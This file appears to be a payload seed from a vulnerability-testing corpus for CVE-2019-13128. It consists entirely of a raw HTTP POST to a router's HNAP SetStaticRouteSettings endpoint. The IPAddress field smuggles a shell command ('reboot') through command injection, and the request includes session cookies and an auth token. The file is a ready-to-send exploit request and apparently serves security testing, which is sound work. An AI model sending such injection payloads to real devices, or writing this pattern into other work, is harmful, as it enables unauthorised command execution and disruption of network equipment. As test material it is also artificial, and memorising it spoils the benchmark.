Vulnerabilities/CVE-2019-13128/BM-2024-00083-payload.seed

POST /HNAP1/ HTTP/1.1
Host: 192.168.33.166:33381
Content-Length: 544
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 179A892070850E942B1E4F600E1922DC 1730701316
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.33.166:33381
Referer: http://192.168.33.166:33381/Home.html
Accept-Encoding: gzip, deflate, br
Cookie: uid=ujcI4DPmyw; PrivateKey=C8B843B87E7C03EF5F224D6D4949A7F1; timeout=8
Connection: keep-alive

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetStaticRouteSettings xmlns="http://purenetworks.com/HNAP1/"><StaticClientInfoList><ClientInfo><IPAddress>10.3.8.211;'`reboot`'</IPAddress><SubnetMask>255.255.255.255</SubnetMask><Gateway>192.168.0.3</Gateway><Interface>lan</Interface></ClientInfo></StaticClientInfoList></SetStaticRouteSettings></soap:Body></soap:Envelope>